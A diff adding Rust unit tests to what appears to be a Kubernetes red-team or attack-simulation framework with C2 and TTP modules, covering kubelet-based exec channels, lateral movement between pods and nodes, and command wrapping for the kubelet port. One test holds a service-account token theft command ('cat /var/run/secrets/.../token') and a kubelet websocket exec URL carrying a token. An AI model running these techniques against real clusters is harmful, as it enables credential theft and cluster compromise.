@@ -3,8 +3,9 @@ use std::collections::HashMap;
 use armory::{Armory, Procedure, Ttp};
 use c2::{ExecTtp, TtpExecuted, BUILTIN_C2_ID};
 use ran_domain::{
-    AccessLevel, C2Server, ContainerEscape, Entity, EntityId, K8sCluster, K8sNode, KubeletExecSink,
-    Pod, PodExec, RceCanExec, RunsOn, Uses,
+    AccessLevel, C2Server, Container, ContainerEscape, Entity, EntityId, JwToken, K8sCluster,
+    K8sNode, KubeletExecSink, Pod, PodExec, RbacPermission, RceCanExec, RunsOn, ServiceAccount,
+    ServiceAccountToken, Uses,
 };
 
 use super::{Campaign, ExecChannel, ExecuteActionError, ExecuteActionRequest};
@@ -133,6 +134,49 @@ fn on_ttp_executed_parses_sys_envvar_into_target_system_info() {
 }
 
 #[test]
+fn on_ttp_executed_marks_exec_pod_running_before_kubelet_source_inference() {
+    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
+
+    let pod = Pod::new("attacker", "default");
+    let pod_id = pod.entity_id().0.clone();
+    campaign.entities.insert_typed(pod);
+
+    let node = K8sNode::new("worker-1");
+    let node_id = node.entity_id().0.clone();
+    campaign.entities.insert_typed(node);
+
+    let mut sa = ServiceAccount::new("attacker-sa", "default");
+    sa.entitlements
+        .push(RbacPermission::new("get", "nodes/proxy"));
+    campaign.entities.insert_typed(sa);
+
+    let mut cmd = sample_exec_ttp(&pod_id, vec![]);
+    cmd.procedure.tool = Some("ran-ws".to_string());
+
+    let event = sample_event("ok\n");
+    let _processed = campaign.on_ttp_executed(&cmd, &event).unwrap();
+
+    let pod_after = campaign
+        .entities
+        .find::<Pod>(&EntityId::new(&pod_id))
+        .expect("pod should exist after execution");
+    assert!(
+        pod_after.is_running,
+        "successful execution should mark pod as running"
+    );
+
+    let has_kubelet_source = campaign
+        .graph
+        .targets_of(&EntityId::new(&pod_id), "kubelet-exec")
+        .iter()
+        .any(|id| id.0 == node_id);
+    assert!(
+        has_kubelet_source,
+        "expected kubelet-exec source relation from pod to node"
+    );
+}
+
+#[test]
 fn on_ttp_executed_failure_records_known_failure_audit() {
     let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
     let cmd = sample_exec_ttp("ns/default/pod", vec!["sys.envvar"]);
@@ -235,6 +279,39 @@ fn resolve_exec_channel_returns_via_compromised_intermediate() {
         .resolve_exec_channel(&target_id)
         .expect("should find channel");
     assert_eq!(ch, ExecChannel::via(BUILTIN_C2_ID, &attacker_id));
+}
+
+#[test]
+fn resolve_exec_channel_finds_path_via_kubelet_source_and_sink() {
+    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
+
+    let mut attacker = Pod::new("entry-hall-pod", "default");
+    attacker.system.access_level = AccessLevel::Exec;
+    let attacker_id = attacker.entity_id().0.clone();
+    campaign.entities.insert_typed(attacker);
+    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);
+
+    let node = K8sNode::new("cplane-01");
+    let node_id = node.entity_id().0.clone();
+    campaign.entities.insert_typed(node);
+
+    let target = Pod::new("argocd-application-controller-0", "argocd");
+    let target_id = target.entity_id().0.clone();
+    campaign.entities.insert_typed(target);
+
+    push_relation(
+        &mut campaign,
+        &ran_domain::KubeletExecSource::new(&attacker_id, &node_id),
+    );
+    push_kubelet_exec_edge(&mut campaign, &node_id, &target_id);
+
+    let ch = campaign
+        .resolve_exec_channel(&target_id)
+        .expect("should resolve through kubelet source + sink chain");
+
+    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
+    assert_eq!(ch.hops, vec![attacker_id.clone(), node_id.clone()]);
+    assert!(ch.exec_target_id.is_none());
 }
 
 #[test]
@@ -686,7 +763,8 @@ fn prepare_action_explicit_exec_source_entity_runs_from_that_system() {
         "semantic target must be the requested target"
     );
     assert_eq!(
-        exec.exec_entity(), source_id,
+        exec.exec_entity(),
+        source_id,
         "physical exec entity must be the supplied source"
     );
     assert_eq!(
@@ -998,8 +1076,80 @@ fn prepare_action_grounds_inner_binary_before_rce_envelope_wrapping() {
     );
     // The C2 kubectl-execs into the entry pod, which then runs the RCE envelope.
     assert_eq!(
-        exec.exec_entity(), entry_id,
+        exec.exec_entity(),
+        entry_id,
         "C2 should exec into entry-pod"
+    );
+}
+
+#[test]
+fn prepare_action_wraps_kubelet_sink_with_ran_ws_envelope() {
+    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
+
+    let attacker = Pod::new("entry-hall-pod", "default");
+    let attacker_id = attacker.entity_id().0.clone();
+    campaign.entities.insert_typed(attacker);
+    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);
+
+    let node = K8sNode::new("cplane-01");
+    let node_id = node.entity_id().0.clone();
+    campaign.entities.insert_typed(node);
+
+    let mut target = Pod::new("argocd-application-controller-0", "argocd");
+    target.containers.push(Container {
+        name: "main".to_string(),
+        image: "argocd/controller".to_string(),
+    });
+    let target_id = target.entity_id().0.clone();
+    campaign.entities.insert_typed(target);
+
+    let mut sa = ServiceAccount::new("entry-hall-sa", "default");
+    sa.token = Some(ServiceAccountToken {
+        jwt: JwToken {
+            raw: "abc.jwt.token".to_string(),
+            ..Default::default()
+        },
+        namespace: "default".to_string(),
+        service_account_name: "entry-hall-sa".to_string(),
+        ..Default::default()
+    });
+    let sa_id = sa.entity_id().0.clone();
+    campaign.entities.insert_typed(sa);
+    push_relation(&mut campaign, &Uses::new(&attacker_id, &sa_id));
+
+    push_relation(
+        &mut campaign,
+        &ran_domain::KubeletExecSource::new(&attacker_id, &node_id),
+    );
+    push_kubelet_exec_edge(&mut campaign, &node_id, &target_id);
+
+    let armory = armory_with_command(
+        "test-kubelet-wrap",
+        "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+        None,
+    );
+    let exec = campaign
+        .prepare_action(
+            ExecuteActionRequest {
+                action_id: "test-kubelet-wrap".to_string(),
+                target_id: target_id.clone(),
+                exec_system_id: None,
+                procedure_id: None,
+                args: HashMap::new(),
+            },
+            &armory,
+        )
+        .expect("should prepare action through kubelet channel");
+
+    assert!(
+        exec.procedure.command.starts_with("ran-ws --url \"wss://cplane-01:10250/exec/argocd/argocd-application-controller-0/main?output=1&error=1&command="),
+        "expected ran-ws kubelet envelope, got: {}",
+        exec.procedure.command
+    );
+    assert!(
+        exec.procedure.command.contains("&command=%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken\" --token abc.jwt.token"),
+        "expected encoded command args + token in ran-ws envelope, got: {}",
+        exec.procedure.command
     );
 }
 
@@ -1034,7 +1184,8 @@ fn prepare_action_exec_system_same_as_target_still_uses_channel_hops() {
         "semantic target must be the requested redis pod"
     );
     assert_eq!(
-        exec.exec_entity(), entry_id,
+        exec.exec_entity(),
+        entry_id,
         "physical exec entity must be the first hop, not target pod directly"
     );
 }
@@ -1092,7 +1243,8 @@ fn prepare_action_local_command_fallback_uses_in_cluster_source_for_pod_target()
 
     assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
     assert_eq!(
-        exec.exec_entity(), entry_id,
+        exec.exec_entity(),
+        entry_id,
         "fallback should exec into entry-hall, not redis directly"
     );
 }
